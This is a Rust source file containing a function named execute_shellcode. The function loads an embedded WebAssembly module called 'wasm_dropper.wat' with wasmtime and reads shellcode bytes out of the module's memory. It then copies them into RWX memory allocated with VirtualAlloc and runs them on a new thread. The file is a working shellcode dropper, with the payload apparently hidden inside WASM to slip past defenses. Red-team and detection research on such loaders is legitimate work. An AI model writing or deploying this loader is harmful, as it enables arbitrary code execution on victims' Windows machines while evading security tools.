use windows::Win32::System::{Threading::{CreateThread, WaitForSingleObject}, Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}};

pub fn execute_shellcode() -> anyhow::Result<(), anyhow::Error> {
    let engine = wasmtime::Engine::default();
    let mut store = wasmtime::Store::new(&engine, ());

    // Embed the .wat file content to avoid path length issues
    let function = include_str!("wasm_dropper.wat");

    // Create a linker to define required imports
    let mut linker = wasmtime::Linker::new(&engine);

    // Define __wbindgen_placeholder__.__wbindgen_describe
    linker.func_wrap(
        "__wbindgen_placeholder__",
        "__wbindgen_describe",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_grow
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_grow",
        |size: i32| -> wasmtime::Result<i32> {
            // Return size as a placeholder
            Ok(size)
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_set_null
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_set_null",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Compile the module from string
    let module = wasmtime::Module::new(&engine, function)?;
    println!("Instantiated Module");

    // Instantiate with linker
    let instance = linker.instantiate(&mut store, &module)?;
    println!("Instantiated Instance");

    // Get exported functions
    let read_func = instance
        .get_func(&mut store, "read_wasm_at_index")
        .expect("`read_wasm_at_index` was not an exported function")
        .typed::<u32, u32>(&store)?;

    println!("read_func");

    let mem_size_func = instance
        .get_func(&mut store, "get_wasm_mem_size")
        .expect("couldn't get mem size")
        .typed::<(), u32>(&store)?;

    println!("mem_size_func");

    let buff_size = mem_size_func.call(&mut store, ())?;
    let mut shellcode_buffer: Vec<u8> = vec![0x00; buff_size as usize];

    println!("buff_size: {buff_size}");

    // Copy shellcode from WASM to buffer
    for i in 0..buff_size {
        shellcode_buffer[i as usize] = read_func.call(&mut store, i)? as u8;
    }

    // Allocate executable memory
    let alloc_ptr = unsafe {
        VirtualAlloc(
            None,
            buff_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if alloc_ptr.is_null() {
        return Err(anyhow::anyhow!("VirtualAlloc failed"));
    }

    // Copy shellcode to allocated memory
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode_buffer.as_ptr(), alloc_ptr as *mut u8, buff_size as usize);
    }

    println!("copy_nonoverlapping");

    // Create and run thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = unsafe {
        CreateThread(
            None,
            0,
            Some(std::mem::transmute(alloc_ptr)),
            None,
            windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
            Some(&mut thread_id),
        )?
    };

    if thread_handle.0.is_null() {
        return Err(anyhow::anyhow!("CreateThread failed"));
    }

    println!("created thread handle: {thread_id}");

    // Wait for thread to complete
    unsafe {
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    Ok(())
}